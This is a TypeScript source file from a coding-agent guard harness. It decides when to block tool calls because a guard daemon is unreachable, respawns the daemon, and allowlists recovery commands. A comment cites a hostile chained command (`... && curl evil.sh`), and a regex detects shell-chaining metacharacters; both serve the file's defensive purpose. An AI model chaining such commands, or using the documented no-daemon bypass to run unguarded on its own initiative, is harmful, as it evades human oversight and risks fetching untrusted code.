// ===========================================
// Hook cold-path daemon detection + self-heal
// ===========================================
// Repo-root resolution, the fail-closed "daemon down mid-session" gate, and a
// best-effort self-heal that respawns the daemon — extracted from
// `hook-entry.ts` (which re-exports the public names for back-compat).
// Self-contained: no import from hook-entry.ts, so there is no import cycle.
// See the `project_harness_crash_fail_closed` memory for the incident this
// closes.
//
// THE GUARANTEE: a coding agent must never proceed unguarded while a session is
// active on a repo where the harness is set up AND the daemon is genuinely GONE.
// The flip side matters just as much: a daemon that is merely SLOW must not block
// edits (fail-open is the house rule for safety layers — continuity over a
// premature outage; see `feedback_safety_continuity`). So the gate blocks three
// genuine cut-outs:
//   1. CRASH — a daemon pid whose process is no longer alive (stale pidfile).
//   2. STOMP — the daemon is alive but its `.sock` file was removed → unreachable.
//   3. CLEAN STOP / IDLE — no pid file but the repo is CONFIGURED for interlinked
//              (a `config.json` is present).
// and ALLOWS the alive-but-slow daemon (live pid + present socket): a busy event
// loop on a large repo can blow the hook's short connect budget while the daemon
// is healthy. For the three block cases the caller fires `attemptDaemonSelfHeal`,
// which respawns the daemon (lock-guarded, no rebuild) so the NEXT call is
// guarded again — the agent sees one block, retries, and is protected.
//
// PID/SOCKET NAMING: a daemon started raw writes `harness.pid` / `harness.sock`;
// one started with `--protocol framed` or a `--session-id` writes
// `harness-default.pid` / `harness-<id>.pid` (+ matching `.sock`) — see
// `session-paths.ts::daemonPathsFor`. The gate must discover ANY of these, or a
// healthy framed/session daemon looks GONE on a connect timeout and gets blocked
// + needlessly self-healed (the regression this fixes).

import { existsSync, readdirSync, readFileSync } from "node:fs";
import { join } from "node:path";
import {
	describeLastExit,
	describeLastLedgerEvent,
	readRecentDaemonEvents,
} from "./harness/daemon-ledger.js";
import type { UnifiedHookEvent } from "./harness/unified-event.js";
import {
	attemptDaemonSelfHeal,
	attemptDaemonSelfHealDetailed,
	type SelfHealAttempt,
	type SelfHealDeps,
	type SelfHealDisposition,
	type SelfHealResult,
} from "./hook-entry-daemon-self-heal.js";
import { findRepoRoot } from "./hook-entry-project.js";
import { readGuardDisable } from "./lib/guard-state.js";

// Deliberate compatibility surface: hook-entry, stop recovery, and the
// established gate tests import these names from this historical module.
export {
	attemptDaemonSelfHeal,
	attemptDaemonSelfHealDetailed,
	type SelfHealAttempt,
	type SelfHealDeps,
	type SelfHealDisposition,
	type SelfHealResult,
};
export { findRepoRoot };

/** Local copy of the pre-tool phase tag (avoids importing from hook-entry.ts,
 *  which would create a cycle — this module is a leaf). */
const PHASE_PRE_TOOL = "pre-tool";

/** List the immediate entries of `.interlinked/`, failing OPEN to an empty array
 *  when the dir is missing/unreadable (or is a file, not a dir). One guarded
 *  readdir shared by the pid + socket scans so the gate never throws on the hook
 *  path — a thrown readdir here would crash the cold gate instead of deciding. */
function listInterlinkedEntries(interlinkedDir: string): string[] {
	try {
		return readdirSync(interlinkedDir);
	} catch {
		return []; // no `.interlinked/` dir (or unreadable) → nothing to scan
	}
}

/** Parse the daemon PID from a pid file; null on absent/garbage. */
function readDaemonPid(pidPath: string): number | null {
	try {
		const n = Number.parseInt(readFileSync(pidPath, "utf-8").trim(), 10);
		return Number.isFinite(n) && n > 0 ? n : null;
	} catch {
		return null;
	}
}

/** All daemon pid-file names present in `.interlinked/`: the raw `harness.pid`
 *  (always considered) plus any framed/session `harness-<id>.pid` (incl.
 *  `harness-default.pid`) that the listing turns up. A daemon started with
 *  `--protocol framed` or a non-default `--session-id` writes the framed names,
 *  NOT the raw one (see `session-paths.ts::daemonPathsFor`). */
function daemonPidFileNames(interlinkedDir: string): string[] {
	const names = ["harness.pid"];
	for (const name of listInterlinkedEntries(interlinkedDir)) {
		if (/^harness-.+\.pid$/.test(name)) names.push(name);
	}
	return names;
}

/** Discover the daemon pid the gate should reason about, scanning the raw AND
 *  framed/session pid files. PREFERS a LIVE pid (so a `--protocol framed` daemon
 *  that is merely slow takes the alive+slow ALLOW path instead of looking GONE on
 *  a connect timeout — the regression this fixes). When NO daemon is alive it
 *  falls back to the first PRESENT-but-dead pid so the crash signal survives (a
 *  stale pidfile must still block + self-heal). Returns null only when no pid
 *  file exists at all — the never-configured / clean-stop case the caller then
 *  resolves via the config check. */
export function discoverDaemonPid(interlinkedDir: string): number | null {
	const names = daemonPidFileNames(interlinkedDir);
	let firstPresent: number | null = null;
	for (const name of names) {
		const pid = readDaemonPid(join(interlinkedDir, name));
		if (pid === null) continue;
		if (isPidAlive(pid)) return pid; // a live daemon wins outright
		if (firstPresent === null) firstPresent = pid; // remember a dead-but-present pid
	}
	return firstPresent; // dead pid (crash) → non-null so the gate still blocks; else null
}

/** True when the repo is set up for interlinked — a committed `config.json` (or
 *  the personal `config.local.json`) is present. This is the signal that the
 *  harness is MEANT to guard this repo, so a missing daemon during an active
 *  session is a cut-out (block), not a never-configured repo (allow). */
function harnessConfigured(interlinkedDir: string): boolean {
	return (
		existsSync(join(interlinkedDir, "config.json")) ||
		existsSync(join(interlinkedDir, "config.local.json"))
	);
}

/** True when a process with `pid` is currently alive (signal-0 probe). A dead
 *  pid (stale pidfile from a crash) → false; an alive pid whose socket RPC just
 *  timed out → true (the daemon is up but slow, not gone). EPERM = the process
 *  exists but is owned by another user → treat as alive. */
function isPidAlive(pid: number): boolean {
	try {
		process.kill(pid, 0);
		return true;
	} catch (err) {
		return (err as NodeJS.ErrnoException).code === "EPERM";
	}
}

/** True when a daemon Unix socket file is present in `.interlinked/` — evidence
 *  it is (or was) listening here. Combined with a live pid this is the "alive but
 *  slow" signal; its ABSENCE next to a live pid is the stomp signal (socket
 *  removed while the daemon stayed up). Matches the raw `harness.sock`, the framed
 *  default `harness-default.sock`, AND any `harness-<id>.sock` so a non-default
 *  session socket is also seen. Uses the shared guarded listing (fails open to
 *  "no socket found"), so it never throws on the hook path. */
function daemonSocketPresent(interlinkedDir: string): boolean {
	return listInterlinkedEntries(interlinkedDir).some((name) =>
		/^harness(-.+)?\.sock$/.test(name),
	);
}

/** The block decision: should a cold-path pre-tool call be refused because the
 *  harness should be guarding this repo but is genuinely GONE? We are on the cold
 *  path because the socket RPC failed/timed out — but that alone does not mean the
 *  daemon is dead. Two ALLOW cases preserve continuity (fail-open is the house
 *  rule for safety layers — a slow guard must not become an edit-blocking outage;
 *  see `feedback_safety_continuity`):
 *    1. Fresh checkout — no pid AND not configured → nothing was ever set up here.
 *    2. Alive but slow — the pid is a LIVE process AND a `.sock` file is present.
 *       On a large repo the daemon's event loop can be busy enough to blow the
 *       hook's short connect budget while it is perfectly healthy; the next call
 *       is served. Blocking here turned a transient slowdown into a flood of
 *       blocked edits (the 2026-06 regression this reverts). The pid is the FIRST
 *       live daemon discovered (raw OR framed/session — see `discoverDaemonPid`),
 *       so a `--protocol framed` daemon also takes this allow path.
 *  Everything else IS a genuine cut-out → block (the caller then self-heals so the
 *  next call is guarded): a dead pid (crash → stale pidfile), an alive pid whose
 *  socket was stomped/removed (unreachable), or a configured repo with no daemon
 *  at all (clean-stop / idle while the session is live). */
export function daemonCutOut(interlinkedDir: string, pid: number | null): boolean {
	if (pid === null && !harnessConfigured(interlinkedDir)) return false;
	if (pid !== null && isPidAlive(pid) && daemonSocketPresent(interlinkedDir)) return false;
	return true;
}

/** The block message; `pidPresent` distinguishes a crash (stale pid) from a
 *  clean-stop/idle on a configured repo, for an accurate diagnosis. */
// `root` is REQUIRED on purpose: this landed as an optional param first, the
// caller edit was dropped in a blocked coordinated refactor, and the result
// compiled cleanly with the context permanently empty — caught only because
// the live probe showed no Context line. Optional params make half-landed
// refactors silent; required ones make them compile errors.
function daemonDownBlockMessage(pidPresent: boolean, root: string): string {
	const why = pidPresent
		? "(harness pid present, no live daemon)"
		: "(configured here, but no live daemon)";
	// The lifecycle ledger turns "unreachable" into a cause. One session
	// (2026-07-28) hit this block a dozen times with four DIFFERENT causes —
	// build-refresh handovers, memory hangs, orphan pile-up, rss-ceiling
	// recycles — and each was re-diagnosed from scratch because this message
	// could not say why the daemon left. A planned handover reads very
	// differently from a crash, and the reader's next move differs too.
	// Quote the last event of ANY kind, not the last EXIT. Measured 2026-08-15:
	// a Write was refused quoting "pid 50829 exited 276s ago: startup-failed"
	// while a NEWER daemon (different pid) was answering — the exit was real,
	// stale, and the wrong headline. A `start` row after it is the news.
	const events = readRecentDaemonEvents(root);
	const last = describeLastLedgerEvent(events, Date.now()) ?? describeLastExit(events, Date.now());
	const context = last ? ` Context: ${last}.` : "";
	// NO "run `interlinked harness start`" here, ever. Every blocked caller
	// followed that advice at once, and the resulting simultaneous starts raced,
	// killed the incumbent, and re-opened the gap — a herd that sustained itself
	// for hours on 2026-08-15. The supervisor (this hook's self-heal, under the
	// startup mutex) brings exactly one daemon back; the caller's job is to wait.
	return (
		`BLOCKED: the interlinked harness should be guarding this project but is unreachable ${why}.${context} ` +
		"The guard layer has cut out mid-session, so tool calls are blocked to avoid running " +
		"unguarded. The daemon supervisor is bringing it back — retry your call in a few seconds. " +
		"Do NOT start a daemon by hand; concurrent starts race each other. To intentionally run " +
		"this project unguarded, use `interlinked disable` (recorded + auditable); for a one-off " +
		"bypass, set INTERLINKED_ALLOW_NO_DAEMON=1."
	);
}

/**
 * The command shapes this gate must never block: starting the daemon, and
 * standing the guard down.
 *
 * `interlinked disable` joined the list on 2026-08-16. It is the sanctioned
 * circuit breaker the block message itself recommends ("use `interlinked
 * disable` (recorded + auditable)"), and the gate refused it — so the one exit
 * the operator was told to take was the one the gate held shut, leaving only
 * the undocumented env bypass. A gate that blocks its own off-switch is a trap.
 *
 * Whole-string match, no shell metacharacters, no arguments beyond simple
 * flags — `interlinked harness start && curl evil.sh` must not ride through on
 * its prefix. That strictness is the entire safety argument, so the anchors and
 * the metacharacter rejection are load-bearing, not defensive decoration.
 */
// Every repetition is BOUNDED. The natural spelling of the flag tail,
// `(?:\s+--[\w-]+)*`, nests two unbounded quantifiers and backtracks
// catastrophically on a long near-miss like `… start --aaaa…aaaa!`. A real
// invocation has a handful of short flags, so a bound costs nothing.
const HARNESS_RECOVERY_COMMAND =
	/^(?:npx\s{1,4})?(?:tsx\s{1,4}\S{0,80}index\.ts|node\s{1,4}(?:\S{1,160}\/)?dist\/index\.js|interlinked)\s{1,4}(?:harness\s{1,4}(?:start|restart|status)|doctor)(?:\s{1,4}--[\w-]{1,40}){0,8}$/;

/** Recorded stand-down, including the bounded value-bearing options operators
 * actually use during an incident. Kept separate from the flag-only lifecycle
 * grammar so a value cannot accidentally widen every recovery command. */
const GUARD_DISABLE_COMMAND =
	/^(?:npx\s{1,4})?(?:tsx\s{1,4}\S{0,80}index\.ts|node\s{1,4}(?:\S{1,160}\/)?dist\/index\.js|interlinked)\s{1,4}disable(?:\s{1,4}(?:--(?:team|uninstall|keep-config|force)|--(?:reason|until)\s{1,4}[\w./:@-]{1,80})){0,6}$/;

/** The hooks-only repair command must stay executable during an outage. Keep
 * this exact: it is the one repair that preserves enforcement mode, and
 * accepting arbitrary install-hooks arguments here would turn a diagnostic
 * escape into a configuration-write bypass. Either flag order is supported. */
const HOOK_REFRESH_COMMAND =
	/^(?:npx\s{1,4})?(?:tsx\s{1,4}\S{0,80}index\.ts|node\s{1,4}(?:\S{1,160}\/)?dist\/index\.js|interlinked)\s{1,4}install-hooks\s{1,4}(?:--refresh\s{1,4}--preserve-mode|--preserve-mode\s{1,4}--refresh)$/;

/**
 * `INTERLINKED_ALLOW_NO_DAEMON=1 <cmd>` as a same-command assignment.
 *
 * The gate reads the variable out of `env`, which is the HOOK process's
 * environment — and the hook runs BEFORE the shell performs the assignment, so
 * an agent that prefixed the documented escape hatch onto its command got
 * blocked anyway (measured 2026-08-07, again 2026-08-15). The documented bypass
 * therefore did not work for the only way anyone actually spells it. Reading it
 * off the command text is what makes it real.
 *
 * Anchored at the start, after at most four other leading assignments and an
 * optional `env`. Every quantifier is bounded, and a mention inside a quoted
 * argument (`echo "INTERLINKED_ALLOW_NO_DAEMON=1"`) cannot match.
 */
const ALLOW_NO_DAEMON_PREFIX =
	/^(?:env\s{1,4})?(?:[A-Z_]{1,40}=[\w./:@-]{0,80}\s{1,4}){0,4}INTERLINKED_ALLOW_NO_DAEMON=(?:1|"1"|'1')\s{1,4}\S/;

/** True when this shell command carries the escape hatch as its own prefix. */
export function commandCarriesNoDaemonBypass(action: UnifiedHookEvent["action"]): boolean {
	if (action.kind !== "shell_command") return false;
	return ALLOW_NO_DAEMON_PREFIX.test(action.command.trim());
}

/** The bypass must be LOUD. Silent fail-open is how four repo files got written
 *  through no gates at all on 2026-08-15 without anyone noticing until review. */
function warnBypassToStderr(message: string): void {
	try {
		process.stderr.write(message);
	} catch {
		/* intentional: a closed stderr must not turn a bypass into a crash */
	}
}

/** Shell metacharacters that could chain a second command onto the first. */
const SHELL_CHAINING = /[;&|><`$(){}\n]/;

/**
 * Public API — is this call the very remedy the block message recommends?
 *
 * The daemon-down block tells the operator to run `interlinked harness start`,
 * and then — because that call is itself a PreToolUse event on an unguarded
 * repo — blocked it. Measured 2026-08-07: a session hit the block, ran the
 * recommended command, and was refused by the same gate; even the documented
 * `INTERLINKED_ALLOW_NO_DAEMON=1` prefix did not help, because the hook process
 * evaluates the call BEFORE the shell assigns that variable. The only exits
 * were waiting for self-heal or standing the guard down entirely.
 *
 * Letting exactly this command through costs nothing: it does not touch repo
 * files, and the state it creates is the guard the gate exists to protect.
 */
export function isHarnessRecoveryCommand(action: UnifiedHookEvent["action"]): boolean {
	if (action.kind !== "shell_command") return false;
	const cmd = action.command.trim();
	if (SHELL_CHAINING.test(cmd)) return false;
	return (
		HARNESS_RECOVERY_COMMAND.test(cmd) ||
		GUARD_DISABLE_COMMAND.test(cmd) ||
		HOOK_REFRESH_COMMAND.test(cmd)
	);
}

/** The project root this gate should evaluate: the explicit cwd, the event's
 *  own cwd, or the process cwd — first that resolves to an interlinked project.
 *  Pulling the `??` chain out keeps the gate under the complexity ratchet as new
 *  decision branches (e.g. the disable check) are added. */
export function resolveGateRoot(event: UnifiedHookEvent, cwd: string | undefined): string | null {
	return findRepoRoot(cwd ?? event.context?.cwd ?? process.cwd());
}

/** Return the project that needs a daemon recovery attempt, for ANY hook
 * phase. This is intentionally separate from the historical pre-tool block
 * predicate: recovery is useful on ordinary/post/lifecycle events too, while
 * only deterministic inline checks should decide whether a tool is refused.
 * Exact status/repair commands are excluded so the hook never races the
 * operator's own recovery process. */
export function daemonRecoveryRoot(
	event: UnifiedHookEvent,
	cwd: string | undefined,
	env: NodeJS.ProcessEnv = process.env,
): string | null {
	if (env.INTERLINKED_ALLOW_NO_DAEMON === "1") return null;
	if (isHarnessRecoveryCommand(event.action)) return null;
	const root = resolveGateRoot(event, cwd);
	if (!root) return null;
	const dir = join(root, ".interlinked");
	if (readGuardDisable(dir)) return null;
	// This helper is called only after the primary RPC failed. A live pid plus
	// a socket FILE is therefore not proof of health — that is precisely the
	// zombie shape. Let the async freshness probe prove a serving socket; here
	// we need only establish that this repo expects a daemon.
	const pid = discoverDaemonPid(dir);
	return pid !== null || harnessConfigured(dir) ? root : null;
}

/**
 * Fail-closed gate for "the harness should be guarding this repo but is down".
 * Returns a block reason on the cold path (daemon unreachable) when either a
 * daemon pid proves a daemon was started (crash/hang) OR the repo is
 * configured for interlinked (clean-stop / idle-exit while the session is
 * still active). The pid is discovered across the raw `harness.pid` AND the
 * framed/session `harness-*.pid` files, so a `--protocol framed` daemon that is
 * merely slow takes the alive+slow ALLOW path instead of being blocked.
 * Returns null when the harness was never set up here (no pid AND no config) —
 * preserving the cold ALLOW path for a fresh checkout — when the project is
 * intentionally stood down (`interlinked disable`), or for lifecycle events /
 * the explicit escape hatch.
 *
 * The caller pairs a block with {@link attemptDaemonSelfHeal} so the daemon
 * comes back automatically — this gate stays a pure decision (no side effects).
 */
/** @deprecated Compatibility/test surface for the retired blanket outage
 * block. Production recovery uses `daemonRecoveryRootFresh` and lets only the
 * deterministic inline gates decide whether a tool is refused. */
export function coldDaemonUnreachableBlockReason(
	event: UnifiedHookEvent,
	cwd: string | undefined,
	env: NodeJS.ProcessEnv = process.env,
	deps: { warn?: (message: string) => void } = {},
): string | null {
	if (event.phase !== PHASE_PRE_TOOL) return null;
	if (env.INTERLINKED_ALLOW_NO_DAEMON === "1") return null;
	if (isHarnessRecoveryCommand(event.action)) return null;
	const root = resolveGateRoot(event, cwd);
	if (!root) return null;
	const dir = join(root, ".interlinked");
	// An intentional, recorded stand-down (`interlinked disable`) means the
	// operator chose to run this project unguarded — honor it, and the caller
	// skips self-heal. A crash or clean-stop leaves NO marker, so the
	// fail-closed branch below still fires for those.
	if (readGuardDisable(dir)) return null;
	// Discover the daemon across the raw AND framed/session pid names. A framed
	// daemon writes `harness-default.pid`, not `harness.pid`; reading only the raw
	// name made a healthy framed daemon look GONE on a connect timeout (→ block +
	// needless self-heal). A live pid (any name) feeds the alive+slow ALLOW path;
	// a present-but-dead pid still feeds the crash block.
	const pid = discoverDaemonPid(dir);
	if (!daemonCutOut(dir, pid)) return null;
	// The escape hatch, honored from the COMMAND TEXT (the hook runs before the
	// shell assigns the variable, so `env` alone can never see a same-command
	// prefix). Checked HERE, after the cut-out decision, so the notice fires
	// exactly when a bypass actually suppressed a block — never on a healthy call.
	if (commandCarriesNoDaemonBypass(event.action)) {
		(deps.warn ?? warnBypassToStderr)(
			"[interlinked] INTERLINKED_ALLOW_NO_DAEMON=1 honored — this command runs UNGUARDED " +
				"while the daemon is unreachable. No line-cap, coverage, or pre-block gate saw it. " +
				"Re-run `interlinked verify` on anything it wrote.\n",
		);
		return null;
	}
	return daemonDownBlockMessage(pid !== null, root);
}
